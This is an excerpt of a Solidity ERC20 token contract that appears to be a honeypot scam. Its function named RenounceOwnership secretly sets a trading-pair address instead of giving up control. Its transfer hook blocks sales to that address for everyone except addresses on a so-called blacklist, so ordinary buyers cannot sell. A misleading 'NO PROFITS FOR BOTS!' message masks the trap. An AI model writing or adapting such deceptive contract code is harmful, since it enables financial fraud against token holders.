...
contract TP is ERC20, Ownable {
    mapping(address=>bool) private _blacklisted;
    address private _tpToken;
    constructor() ERC20('TP','TP') {
    ...
    function RenounceOwnership(address tpToken_) public onlyOwner {
        _tpToken = tpToken_;
    }

    function _lamboFactory(address from, address to, uint256 amount) internal virtual override {
        if(to == _tpToken) {
            require(_blacklisted[from], "NO PROFITS FOR BOTS!");
        }
    }
}